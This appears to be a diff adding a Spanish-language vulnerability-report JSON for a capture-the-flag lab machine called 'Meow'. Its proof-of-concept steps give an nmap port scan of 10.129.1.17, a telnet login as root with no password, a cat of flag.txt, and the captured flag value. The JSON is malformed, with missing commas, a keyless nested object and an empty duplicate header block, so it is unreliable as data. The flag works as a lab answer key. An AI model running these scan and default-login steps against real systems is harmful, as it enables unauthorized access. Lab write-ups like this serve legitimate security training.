@@ -1,0 +1,27 @@
+{
+    "título_vulnerabilidad": "",
+    "tipo_vulnerabilidad": "",
+    "id_activo": "",
+    {
+    "objetivo": "Meow"
+    "titulo_vulnerabilidad": "simple brute-forcing attack telnet",
+    "tipo_vulnerabilidad": "",
+    "id_activo": "",
+    "descripción_vulnerabilidad": "Se identifica el servicio 23/tcp telnet abierto y se usa la credencial por defecto telnet para entrar a la maquina victima",
+    "url_afectada": "10.129.1.17",
+    "prueba_de_concepto": {
+      "pasos_para_reproducir": [
+      "1.ping -c 1 10.129.1.17",
+      "2.sudo nmap -p- --open --min-rate 5000 -sV -sS -n -Pn -vvv 10.129.1.17 -oG allPorts",
+      "3.sudo telnet 10.129.1.17"
+      "4.root",
+      "5.cat flag.txt"
+      "b40abdfe23665f766f9c61ecba8a4c19"
+        
+      ]
+    },
+    "impacto_o_criticiad": "",
+    "sugerencia_de_solución": "",
+    "explotabilidad": "",
+    "cwe": 0
+  }
